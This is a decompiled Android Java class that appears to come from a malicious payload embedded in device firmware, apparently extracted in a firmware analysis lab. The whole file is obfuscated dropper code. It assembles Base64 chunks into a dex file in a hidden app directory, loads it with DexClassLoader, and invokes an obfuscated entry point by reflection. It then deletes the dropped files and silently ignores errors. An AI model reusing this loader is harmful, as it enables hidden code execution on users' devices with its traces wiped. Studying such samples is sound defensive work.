package com.system.framework.media.a;

import android.content.Context;
import android.os.Build;
import android.os.Process;
import android.util.Base64;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;

/* JADX INFO: compiled from: DexUtils.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/64/classes.dex */
public class d {
    private static boolean a = false;
    private static HashMap<String, ClassLoader> b = new HashMap<>();

    public static synchronized void a(Context context, int index, int stateType) {
        if (context != null) {
            try {
                if (!a && (index <= 1 || stateType == 1 || !i.a(context))) {
                    a = true;
                    String className = null;
                    String methodName = i.a(c.l);
                    if (index == 0) {
                        className = i.a(c.i);
                    } else if (index == 1) {
                        className = i.a(c.j);
                    }
                    String fileName = new StringBuilder().append(Process.myUid()).toString();
                    String tempName = new StringBuilder().append(Process.myUid()).toString();
                    try {
                        String[] names = context.getPackageName().split("\\.");
                        tempName = names[names.length - 1];
                        fileName = String.valueOf(tempName) + "@" + Process.myUid();
                    } catch (Throwable th) {
                    }
                    if (b.get(fileName) == null) {
                        ArrayList<String> list = new ArrayList<>();
                        if (index == 0) {
                            a bufferA = new a();
                            list.addAll(bufferA.a());
                            list.addAll(bufferA.b());
                            list.addAll(bufferA.c());
                            list.addAll(bufferA.d());
                        } else if (index == 1) {
                            b bufferB = new b();
                            list.addAll(bufferB.a());
                            list.addAll(bufferB.b());
                            list.addAll(bufferB.c());
                            list.addAll(bufferB.d());
                            list.addAll(bufferB.e());
                            list.addAll(bufferB.f());
                            list.addAll(bufferB.g());
                            list.addAll(bufferB.h());
                            list.addAll(bufferB.i());
                            list.addAll(bufferB.j());
                        }
                        StringBuffer sbData = new StringBuffer();
                        for (String str : list) {
                            sbData.append(str);
                        }
                        String dirPath = String.valueOf(context.getFilesDir().getAbsolutePath()) + File.separator + "." + tempName;
                        File logDir = new File(dirPath);
                        if (!logDir.exists() || !logDir.isDirectory()) {
                            if (logDir.isFile()) {
                                logDir.delete();
                            }
                            logDir.mkdirs();
                        }
                        String filePath = String.valueOf(dirPath) + File.separator + fileName + i.a(c.g);
                        a(filePath, Base64.decode(sbData.toString(), 0));
                        File file = new File(filePath);
                        if (file.exists() && file.isFile() && file.canRead() && file.length() > 0) {
                            b.put(fileName, a(context, filePath, dirPath));
                        }
                        a(filePath);
                        a(String.valueOf(dirPath) + File.separator + fileName + i.a(c.h));
                        e.a(dirPath);
                    }
                    if (b.containsKey(fileName)) {
                        a(context, b.get(fileName), className, methodName, stateType);
                    }
                    a = false;
                }
            } catch (Throwable th2) {
                a = false;
            }
        }
    }

    private static void a(Context context, ClassLoader classLoader, String className, String methodName, int stateType) throws Throwable {
        Class<?> myClass = classLoader.loadClass(className);
        Constructor<?> myConstructor = myClass.getConstructor(new Class[0]);
        Method method = myClass.getMethod(methodName, Context.class, Integer.TYPE);
        method.setAccessible(true);
        method.invoke(myConstructor.newInstance(new Object[0]), context, Integer.valueOf(stateType));
    }

    private static ClassLoader a(Context context, String filePath, String dirPath) throws Throwable {
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                new File(filePath).setReadOnly();
            }
        } catch (Throwable th) {
        }
        return new DexClassLoader(filePath, dirPath, null, d.class.getClassLoader());
    }

    private static void a(String filePath, byte[] data) {
        try {
            File outFile = new File(filePath);
            if (outFile.exists()) {
                outFile.delete();
            }
            FileOutputStream fos = new FileOutputStream(outFile);
            fos.write(data);
            fos.flush();
            fos.close();
        } catch (Throwable th) {
        }
    }

    private static void a(String path) {
        try {
            File file = new File(path);
            if (file.exists()) {
                file.delete();
            }
        } catch (Throwable th) {
        }
    }
}
